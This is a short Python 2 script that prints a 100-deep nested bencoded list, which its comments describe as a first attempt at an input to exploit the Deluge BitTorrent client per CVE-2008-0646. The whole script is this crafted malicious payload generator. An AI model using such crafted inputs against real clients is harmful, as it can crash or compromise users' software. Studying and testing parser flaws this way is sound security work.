__author__ = 'wallsr'

# This script is my first attempt at creating a 100-depth recursive bencoded string.
# The idea is to use a similar string to exploit Deluge per CVE 2008-0646

#l4:spam

depth = 100

print 'l4:spam'*depth + 'e'*depth
